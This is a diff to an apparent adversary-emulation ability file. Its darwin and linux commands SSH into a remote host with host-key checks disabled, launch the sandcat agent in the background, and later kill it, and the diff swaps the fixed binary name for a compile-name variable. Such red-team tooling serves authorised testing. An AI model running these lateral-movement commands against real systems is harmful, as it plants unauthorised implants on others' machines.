@@ -11,14 +11,14 @@
     darwin:
       sh:
         command: |
-          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./#{sandcat.compile.name}-linux 1>/dev/null 2>/dev/null &'
         cleanup: |
-          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'
-        payload: sandcat.go-linux
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f #{sandcat.compile.name})'
+        payload: sandcat.go
     linux:
       sh:
         command: |
-          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./#{sandcat.compile.name}-linux 1>/dev/null 2>/dev/null &'
         cleanup: |
-          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f #{sandcat.compile.name})'
         payload: sandcat.go
